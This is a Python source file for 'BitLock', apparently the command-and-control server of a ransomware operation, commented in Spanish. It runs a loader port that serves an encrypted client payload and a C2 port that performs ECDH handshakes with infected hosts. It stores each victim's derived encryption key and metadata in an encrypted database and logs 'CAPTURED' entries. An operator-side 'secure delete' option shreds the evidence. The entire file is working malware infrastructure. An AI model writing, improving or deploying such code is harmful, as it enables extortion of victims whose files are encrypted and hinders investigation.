#!/usr/bin/env python3
import socket
import threading
import argparse
import json
import os
import sys
import getpass
import struct
import secrets
from datetime import datetime
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ============= CONFIGURACIÓN DE PRODUCCIÓN =============
HOST = '0.0.0.0'
PORT_C2 = 5000
PORT_LOADER = 5001
LOG_FILE_ENC = 'BitLockC2.log.bin'
KEYS_DB_ENC = 'ikeys.json.bin'
MASTER_CHECK = 'master.check'
PAYLOAD_FILE = 'BitLock-client.py'
ITERATIONS = 480000

class C:
    G, Y, CY, R, B, RES = "\033[32m", "\033[33m", "\033[36m", "\033[31m", "\033[1m", "\033[0m"

# ============= FUNCIONES DE SEGURIDAD FÍSICA =============
def secure_delete(filepath, passes=3):
    if not os.path.exists(filepath): return
    try:
        with open(filepath, "ba+", buffering=0) as f:
            length = f.tell()
            for _ in range(passes):
                f.seek(0)
                f.write(secrets.token_bytes(length))
                os.fsync(f.fileno())
        os.remove(filepath)
        print(f"{C.G}[+] {filepath} eliminado permanentemente.{C.RES}")
    except Exception as e:
        print(f"{C.R}[!] No se pudo triturar {filepath}: {e}{C.RES}")

# ============= MOTOR CRIPTOGRÁFICO (BÓVEDA) =============
class CryptoVault:
    def __init__(self, passphrase):
        self.passphrase = passphrase

    def _derive_key(self, salt: bytes) -> bytes:
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=ITERATIONS)
        return kdf.derive(self.passphrase.encode())

    def encrypt(self, data: bytes) -> bytes:
        salt = os.urandom(16)
        key = self._derive_key(salt)
        nonce = os.urandom(12)
        return salt + nonce + AESGCM(key).encrypt(nonce, data, None)

    def decrypt(self, blob: bytes) -> bytes:
        try:
            salt, nonce, ciphertext = blob[:16], blob[16:28], blob[28:]
            key = self._derive_key(salt)
            return AESGCM(key).decrypt(nonce, ciphertext, None)
        except: raise ValueError("Clave incorrecta")

# ============= GESTIÓN DE DATOS PROTEGIDOS =============
class SecureStorage:
    def __init__(self, vault):
        self.vault = vault
        self.lock = threading.Lock()

    def log(self, msg):
        with self.lock:
            entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n".encode()
            enc = self.vault.encrypt(entry)
            with open(LOG_FILE_ENC, "ab") as f:
                f.write(struct.pack(">I", len(enc)) + enc)

    def show_logs(self):
        if not os.path.exists(LOG_FILE_ENC): return print("[-] Logs vacíos.")
        with open(LOG_FILE_ENC, "rb") as f:
            while True:
                sz_raw = f.read(4)
                if not sz_raw: break
                size = struct.unpack(">I", sz_raw)[0]
                print(self.vault.decrypt(f.read(size)).decode(), end="")

    def show_json(self):
        if not os.path.exists(KEYS_DB_ENC): return print("{}")
        with open(KEYS_DB_ENC, "rb") as f:
            print(json.dumps(json.loads(self.vault.decrypt(f.read())), indent=4))

    def store_key(self, vid, key, meta):
        with self.lock:
            db = {}
            if os.path.exists(KEYS_DB_ENC):
                try: db = json.loads(self.vault.decrypt(open(KEYS_DB_ENC, "rb").read()))
                except: db = {}
            db[vid] = {'key': key, 'ts': datetime.now().isoformat(), 'meta': meta}
            with open(KEYS_DB_ENC, "wb") as f:
                f.write(self.vault.encrypt(json.dumps(db).encode()))

# ============= SERVIDOR C2 (MULTI-PUERTO) =============
class BitLockC2:
    def __init__(self, vault):
        self.vault = vault
        self.storage = SecureStorage(vault)

    def _handle_ecdhe(self, conn):
        server_private = ec.generate_private_key(ec.SECP384R1())
        server_pub = server_private.public_key().public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
        conn.send(b"MODE:ECDHE\n" + server_pub)
        data = conn.recv(8192)
        parts = data.split(b'\n---METADATA---\n', 1)
        client_pub = serialization.load_pem_public_key(parts[0])
        meta = json.loads(parts[1].decode()) if len(parts) > 1 else {}
        shared = server_private.exchange(ec.ECDH(), client_pub)
        key = HKDF(hashes.SHA256(), 32, None, b'BitLock-c2-session').derive(shared)
        conn.send(b"OK:ECDHE")
        return key.hex(), meta

    def _client_handler(self, conn, addr):
        try:
            req = conn.recv(1024).decode('utf-8', errors='ignore')
            if "HANDSHAKE" in req:
                key, meta = self._handle_ecdhe(conn)
                vid = f"{addr[0]}_{datetime.now().strftime('%H%M%S')}"
                self.storage.store_key(vid, key, meta)
                self.storage.log(f"CAPTURED: {vid} de {addr[0]}")
                print(f"{C.G}[+] Key secured: {vid}{C.RES}")
        except: pass
        finally: conn.close()

    def start(self):
        def loader():
            s = socket.socket(); s.bind((HOST, PORT_LOADER)); s.listen(10)
            while True:
                c, a = s.accept()
                d = c.recv(1024)
                if d.startswith(b"KEY:") and os.path.exists(PAYLOAD_FILE):
                    l_key = d[4:36]
                    with open(PAYLOAD_FILE, "rb") as f: p = f.read()
                    n = os.urandom(12)
                    c.sendall(n + AESGCM(l_key).encrypt(n, p, None))
                c.close()
        threading.Thread(target=loader, daemon=True).start()

        s = socket.socket(); s.bind((HOST, PORT_C2)); s.listen(20)
        print(f"\n{C.B}{C.G}=== BitLock: ONLINE & ENCRYPTED ==={C.RES}")
        while True:
            c, a = s.accept()
            threading.Thread(target=self._client_handler, args=(c, a), daemon=True).start()

# ============= MAIN / ARGUMENTOS =============
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument('--logs', action='store_true')
    p.add_argument('--json', action='store_true')
    p.add_argument('--del', action='store_true', dest='delete_all')
    args = p.parse_args()

    # Opción de borrado seguro
    if args.delete_all:
        print(f"{C.R}{C.B}[!!!] ADVERTENCIA: BORRADO SEGURO [!!!]{C.RES}")
        if input("¿Eliminar todos los datos permanentemente? (s/n): ").lower() == 's':
            for f in [LOG_FILE_ENC, KEYS_DB_ENC, MASTER_CHECK]: secure_delete(f)
            print(f"{C.Y}[!] Sistema triturado.{C.RES}")
        sys.exit(0)

    pw = getpass.getpass(f"{C.B}Master Passphrase: {C.RES}")
    vault = CryptoVault(pw)

    # Validación de Passphrase
    if not os.path.exists(MASTER_CHECK):
        with open(MASTER_CHECK, "wb") as f: f.write(vault.encrypt(b"ROOT"))
        print(f"{C.Y}[!] Master Check generado.{C.RES}")
    else:
        try: vault.decrypt(open(MASTER_CHECK, "rb").read())
        except: print(f"{C.R}Error: Passphrase incorrecta.{C.RES}"); exit(1)

    storage = SecureStorage(vault)
    if args.logs: storage.show_logs()
    elif args.json: storage.show_json()
    else: BitLockC2(vault).start()
